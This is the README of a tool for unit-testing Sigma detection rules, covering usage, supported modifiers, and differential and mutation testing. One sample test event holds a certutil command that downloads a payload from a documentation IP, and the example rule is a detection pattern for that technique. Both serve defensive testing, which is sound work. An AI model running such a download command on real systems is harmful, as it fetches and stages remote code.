# rulefire

[![CI](https://github.com/sriharifortitude/rulefire/actions/workflows/ci.yml/badge.svg)](https://github.com/sriharifortitude/rulefire/actions/workflows/ci.yml)

Unit tests for Sigma detection rules. A test file names a rule, the events it must fire on and
the events it must not; `rulefire test` evaluates the rule against each one and, when a case
fails, says which selection did not match and which entry in it failed. It runs in CI with no
SIEM, no lab and no network. Python, one dependency (PyYAML), MIT.

## What it is for

Detection rules decay quietly. Someone adds a filter for a noisy backup server and the filter
also matches the attack; someone narrows `Image` to the usual path and a renamed binary walks
past. Nothing fails, because nothing runs the rule until there is an incident.

The example in this repository is a rule for `certutil` downloading a payload. Its first
version looked for `-urlcache` and `-f` with a hyphen and found certutil by file name. The test
file holds the cases it should catch, including `/urlcache` (Windows tools take either), an en
dash in place of the hyphen, and a renamed copy of certutil:

<!-- demo:start -->
```
$ rulefire test examples/tests
examples/tests/certutil_download.tests.yml  (Certutil Used to Download a File)
  ok    match[0]
  ok    match[1]
  ok    match[2]
  ok    match[3]
  ok    no_match[0]
  ok    no_match[1]
  ok    no_match[2]

7 passed, 0 failed, 0 test file(s) could not run

$ rulefire test -q examples/regression
examples/regression/certutil_download_v1.tests.yml  (Certutil Used to Download a File (first version))
  FAIL  match[1]: did not fire
        condition: certutil and download and not filter_update_server
        certutil: matched
        download: no match (CommandLine|contains|all did not match)
        filter_update_server: no match (CommandLine|contains did not match)
  FAIL  match[2]: did not fire
        condition: certutil and download and not filter_update_server
        certutil: matched
        download: no match (CommandLine|contains|all did not match)
        filter_update_server: no match (CommandLine|contains did not match)
  FAIL  match[3]: did not fire
        condition: certutil and download and not filter_update_server
        certutil: no match (Image|endswith did not match)
        download: matched
        filter_update_server: no match (CommandLine|contains did not match)

4 passed, 3 failed, 0 test file(s) could not run
```
<!-- demo:end -->

The current rule passes; the first version fails three cases, and the output points at the
cause of each: `download` needed `windash`, and `certutil` needed the `OriginalFileName`
alternative. The fixed rule is
[examples/rules/certutil_download.yml](examples/rules/certutil_download.yml).

## Usage

```bash
pip install git+https://github.com/sriharifortitude/rulefire@v0.1.0

rulefire test tests/                                   # every *.tests.yml under tests/
rulefire test tests/ --junit rulefire.xml              # for GitLab, Jenkins, Azure DevOps
rulefire scan rules/ --events baseline.jsonl --benign  # fail if any rule fires on known-benign events
rulefire explain rules/x.yml '{"Image": "C:\\x\\certutil.exe", "CommandLine": "..."}'
rulefire check rules/                                  # rules rulefire cannot evaluate, unused selections
```

A test file:

```yaml
rule: ../rules/certutil_download.yml      # relative to this file
match:
  - Image: C:\Windows\System32\certutil.exe
    CommandLine: certutil /urlcache /f https://203.0.113.7/payload.bin out.bin
no_match:
  - Image: C:\Windows\System32\certutil.exe
    CommandLine: certutil -hashfile C:\Windows\explorer.exe SHA256
match_file: samples/certutil_attacks.jsonl   # optional: events from real logs, one JSON object per line
```

Events use the field names the rule uses; nested objects can be reached with dotted names
(`process.name`). `scan` is for the other direction: run every rule over a day of benign
events and see which ones would have alerted, and how often.

Exit codes: 0 everything passed, 1 a case failed (or, with `--benign`, a rule fired), 2 a usage
error or unreadable input.

## What it evaluates

Everything a single-event Sigma rule can contain: selections as maps (AND) and lists of maps
(OR), keyword lists, `null`, numbers and booleans; the modifiers `contains`, `startswith`,
`endswith`, `all`, `re` (with `i`, `m`, `s`), `cidr`, `base64`, `base64offset`, `utf16le`,
`utf16be`, `utf16`, `wide`, `windash`, `exists`, `gt`, `gte`, `lt`, `lte`, `cased` and
`fieldref`; and conditions with `and`, `or`, `not`, parentheses, `1 of`, `all of` and `them`.

Matching is case-insensitive unless `cased` (or `re`) says otherwise, as the Sigma
specification requires. Two choices go beyond the specification: a number matches text that
spells it (`EventID: 4688` matches `"4688"`), because log pipelines often deliver numbers as
strings, and a field holding a list matches when any element does.

A backslash escapes only `*`, `?` and another backslash; anywhere else it is a literal
backslash, which is why Windows paths can be written as they are. The catch is `\?` and `\*`:
`C:\Windows\?` means a literal question mark. Write `C:\Windows\\?` for a backslash followed by
a wildcard.

[ADR 1](docs/adr/0001-evaluate-rules-directly.md) explains why rulefire evaluates rules itself
rather than through a SIEM query, and [ADR 2](docs/adr/0002-what-rulefire-will-not-do.md) what
it refuses: correlation rules, `| count()`, `expand`, rule collections and field mappings.

## Tested

```bash
pip install -e ".[dev]" && pytest                    # 45 tests
pip install -e ".[differential]"
python scripts/differential.py sigma/rules sigma/rules-emerging-threats sigma/rules-threat-hunting
```

**Against pySigma.** `scripts/differential.py` compares rulefire with pySigma 2.0.1 and its
SQLite backend over the SigmaHQ repository (pinned to the commit of 2026-10-21 in CI). For each
rule it builds events from the rule itself: one meant to satisfy each selection, near misses of
each (a field dropped, its case swapped, one character changed, a number written as text),
and pairs merged so that filters fire. pySigma's SQL for the rule runs over the same events in
SQLite, and the two answers have to agree on every event. On 3,667 rules and 46,571 events,
13,179 of them matching, they do, apart from two documented differences, which the script
checks are the cause before counting them as such: 439 events with a number written as text,
and 1 with a non-ASCII letter in another case (SQLite only ignores the case of ASCII). pySigma
cannot convert 107 of the rules, all of them keyword searches, so those have no oracle; rulefire
refuses 2, which use `expand`.

The SQL needed one adjustment first: the backend writes a value without wildcards as `=`,
which SQLite compares case-sensitively, so the first run disagreed on every case-swapped event.
The table's columns are declared `COLLATE NOCASE` to give `=` the meaning Sigma gives it.

The comparison found one mistake in rulefire, now fixed: `fieldref` compared case-sensitively.
It covers what the event builder can satisfy: 2,959 of the 3,667 rules fired on at least one
event, including 83 of the 131 that use `re` (only plain regular expressions get a matching
event), all 25 using `cidr` and all 8 using `base64offset`, but only 39 of the 88 using
`windash`.

**Mutation testing.** I broke the code in 48 places on purpose. On the first run 10 mutants
survived. One was a typo in my harness. One marked a check that changed nothing (`*` was not
added twice in front of a pattern, but `.*.*` matches what `.*` does), which I deleted. The
other eight were tests that could not fail: `?` was only tested where `*` would also have
matched, `lte` never at its boundary, booleans never against numbers, and the tests for
aggregations, collections and correlation rules used input that was rejected for some other
reason first. All 47 mutants of the current code are caught.

Writing a test also corrected me: I first wrote `System32\?MD.EXE` expecting `?` to be a
wildcard. In Sigma it is an escaped question mark, and rulefire was right.

## Not tested, and not done

- No SIEM was involved. Agreement with pySigma's SQLite backend says nothing about how
  Splunk, Elastic or Sentinel will run the converted query; their backends have their own
  differences, and field mapping is left to them.
- Regular expressions run on Python's `re`, which differs from PCRE, RE2 and Java in corners
  (possessive quantifiers, `\Z`, Unicode classes). A rule tested here can still behave
  differently in a SIEM that uses another engine.
- Keyword rules are evaluated as a case-insensitive substring search over every field value.
  SIEMs search the raw event, tokenized; results can differ on punctuation and word
  boundaries. pySigma could not provide an oracle for these.
- No fuzzing: Python has no built-in fuzzer, and the differential's generated events are the
  nearest thing.
